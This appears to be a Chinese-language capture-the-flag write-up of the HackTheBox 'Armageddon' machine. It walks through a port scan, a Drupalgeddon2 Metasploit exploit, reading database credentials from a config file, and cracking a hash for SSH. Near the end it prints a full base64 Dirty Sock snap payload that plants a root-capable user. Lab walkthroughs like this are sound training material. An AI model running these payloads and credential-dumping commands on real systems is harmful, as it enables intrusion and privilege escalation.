# HackTheBox Armageddon

  
  
&lt;!--more--&gt;  
```bash  
sudo nmap --min-rate 100000 -A -sS   
  
Host is up (0.18s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)  
| ssh-hostkey:   
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)  
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)  
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)  
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)  
|_http-title: Welcome to  Armageddon |  Armageddon  
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16  
| http-robots.txt: 36 disallowed entries (15 shown)  
| /includes/ /misc/ /modules/ /profiles/ /scripts/   
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt   
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt   
|_/LICENSE.txt /MAINTAINERS.txt  
|_http-generator: Drupal 7 (http://drupal.org)  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.94%E=4%D=4/15%OT=22%CT=1%CU=37686%PV=Y%DS=2%DC=T%G=Y%TM=661CA4C  
OS:3%P=x86_64-apple-darwin21.6.0)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SE  
OS:Q(SP=108%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I  
OS:%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11  
OS:NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71  
OS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4  
OS:0%S=O%A=S&#43;%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O  
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40  
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q  
OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y  
OS:%DFI=N%T=40%CD=S)  
  
Network Distance: 2 hops  
  
TRACEROUTE (using port 1723/tcp)  
HOP RTT       ADDRESS  
1   132.89 ms 10.10.16.1  
2   214.85 ms 10.129.48.89  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds  
```  
存在`22`端口和`80`端口  
`80`端口存在`Web`服务，并且存在很多文件  
其中`/CHANGELOG.txt`存在版本信息  
`Drupal 7.56, 2017-06-21`  
利用`msf`搜索一下  
利用`exploit/unix/webapp/drupal_drupalgeddon2`这个漏洞  
成功获得一个`shell`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404151210549.png)
但是权限很低  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404151213101.png)
无法打开任何`flag`  
目标还开放了一个`22`端口，这里考虑密码复用，连接22端口  
通过`/etc/passwd`得知存在`brucetherealadmin`用户，在配置文件和数据库中找一下  
在`sites/default/settings.php`中存在数据库账号和密码  
```php  
$databases = array (  
  &#39;default&#39; =&gt;   
  array (  
    &#39;default&#39; =&gt;   
    array (  
      &#39;database&#39; =&gt; &#39;drupal&#39;,  
      &#39;username&#39; =&gt; &#39;drupaluser&#39;,  
      &#39;password&#39; =&gt; &#39;CQHEy@9M*m23gBVj&#39;,  
      &#39;host&#39; =&gt; &#39;localhost&#39;,  
      &#39;port&#39; =&gt; &#39;&#39;,  
      &#39;driver&#39; =&gt; &#39;mysql&#39;,  
      &#39;prefix&#39; =&gt; &#39;&#39;,  
    ),  
  ),  
);  
```  
在数据库中找到疑似`SSH`的密码  
```  
mysql -h localhost -u &#34;drupaluser&#34; -pCQHEy@9M*m23gBVj &#34;drupal&#34; -e &#34;select uid,name,pass from users;&#34;  
  
brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404151440330.png)
利用`cmd5`查出`hash`值，成功登陆  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404151441248.png)
`sudo -l`查看详细权限  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404151442888.png)
可以用root权限运行`snap`命令  
参考文章  
https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  
生成命令  
```bash  
python2 -c &#39;print&#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA&#43;AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA&#43;PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5&#43;qumvhFkbY5Pr4ba1mk4&#43;lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc&#43;MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#34;&#43; &#34;A&#34;*4256 &#43; &#34;==&#34;&#39; | base64 -d &gt; exploit.snap  
```  
运行`sudo /usr/bin/snap install --devmode exploit.snap`  
切换到`dirty_sock`用户，密码同样是`dirty_sock`  
`sudo cat /root/root.txt`  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/hackthebox-armageddon/  

